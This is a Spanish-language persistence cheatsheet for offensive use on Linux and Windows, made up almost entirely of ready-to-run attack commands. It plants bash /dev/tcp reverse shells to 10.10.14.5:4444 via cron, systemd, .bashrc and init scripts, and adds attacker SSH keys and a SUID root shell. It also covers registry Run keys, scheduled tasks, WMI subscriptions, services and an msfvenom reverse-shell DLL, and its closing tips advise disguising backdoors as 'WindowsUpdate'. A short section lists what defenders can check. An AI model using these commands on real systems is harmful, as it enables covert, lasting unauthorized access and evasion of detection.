# Nombre: cheatsheet-persistence
# Descripción: Métodos de persistencia en Linux y Windows: cron, systemd, servicios, RunKey, WMI, tareas y más.
# Tags: persistence, linux, windows, systemd, cron, registry, wmi, backdoor
# Uso: referencia rápida de técnicas de persistencia por plataforma

# Cheatsheet de Persistencia

## 1. Linux — Cron

```bash
# Cron del usuario
crontab -e
# Agregar: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Cron del sistema
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab
chmod +x /tmp/backdoor.sh

# Cron en /etc/cron.d/
echo "* * * * * root /tmp/backdoor.sh" > /etc/cron.d/persist

# Verificar cron activo
ls -la /etc/cron* /var/spool/cron/
```

## 2. Linux — Systemd Service

```bash
# Crear servicio
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

## 3. Linux — .bashrc / .profile

```bash
# Ejecutar al login (usuario)
echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" &' >> ~/.bashrc

# O en .profile / .bash_profile
echo '/tmp/backdoor.sh &' >> ~/.profile
```

## 4. Linux — SSH Key

```bash
# Añadir clave pública alauthorized_keys
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

## 5. Linux — SUID Backdoor

```bash
# Copiar bash con SUID
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p  # shell root
```

## 6. Linux — Init Script (SysVinit)

```bash
cat > /etc/init.d/backdoor << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          backdoor
# Required-Start:    $remote_fs
# Required-Stop:     $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
### END INIT INFO
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &
EOF
chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults
```

---

## 7. Windows — Registry RunKey

```powershell
# Run key (usuario)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Temp\backdoor.exe" /f

# RunOnce (se ejecuta una vez)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Updater" /t REG_SZ /d "C:\Temp\backdoor.exe" /f

# Run key global (todos los usuarios, requiere admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Temp\backdoor.exe" /f
```

## 8. Windows — Scheduled Tasks

```powershell
# Crear tarea programada
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\backdoor.exe" /sc minute /mo 5 /ru SYSTEM

# Con PowerShell
Register-ScheduledTask -TaskName "WindowsUpdate" -Action (New-ScheduledTaskAction -Execute "C:\Temp\backdoor.exe") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries)

# Verificar
schtasks /query /tn "WindowsUpdate" /fo LIST /v
```

## 9. Windows — WMI Event Subscription

```powershell
# Crear evento WMI que ejecuta cada 60 segundos
$filterName = "PersistFilter"
$consumerName = "PersistConsumer"

$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "C:\Temp\backdoor.exe"
}

Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# Verificar
Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter"
Get-WmiObject -Namespace "root\subscription" -Class "CommandLineEventConsumer"
```

## 10. Windows — Service

```powershell
# Crear servicio
sc create "WindowsUpdateSvc" binPath= "C:\Temp\backdoor.exe" start= auto
sc description "WindowsUpdateSvc" "Windows Update Service"

# Con PowerShell
New-Service -Name "WindowsUpdateSvc" -BinaryPathName "C:\Temp\backdoor.exe" -StartupType Automatic -Description "Windows Update Service"

# Verificar
sc qc WindowsUpdateSvc
Get-Service WindowsUpdateSvc
```

## 11. Windows — Startup Folder

```powershell
# Copiar a la carpeta Startup del usuario
copy C:\Temp\backdoor.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"

# O para todos los usuarios (requiere admin)
copy C:\Temp\backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

## 12. Windows — DLL Hijacking

```powershell
# Buscar DLLs buscadas por aplicaciones
procmon  # filtrar NAME NOT FOUND

# Crear DLL maliciosa y colocarla en la ruta donde la busca la app
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll
```

## 13. Windows — COM Object Hijacking

```powershell
# Modificar registro para ejecutar código al iniciar componentes COM
reg add "HKCU\Software\Classes\CLSID\{MISSING-CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\Temp\backdoor.dll" /f
```

## Verificación y Limpieza

```bash
# Linux - Qué buscar
crontab -l
ls -la /etc/cron* /etc/systemd/system/
cat ~/.bashrc ~/.profile
ls -la ~/.ssh/authorized_keys

# Windows - Qué buscar
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
schtasks /query /fo LIST /v
Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter"
sc query type= all state= all | findstr "backdoor"
```

## Tips
- Priorizar métodos que sobrevivan reinicios (cron, systemd, servicios, RunKey)
- WMI y COM son más stealth pero más complejos
- Evitar nombrar servicios/tareas de forma sospechosa
- Probar persistencia inmediatamente después de configurarla
- Usar nombres legítimos (WindowsUpdate, SecurityHealth, etc.)
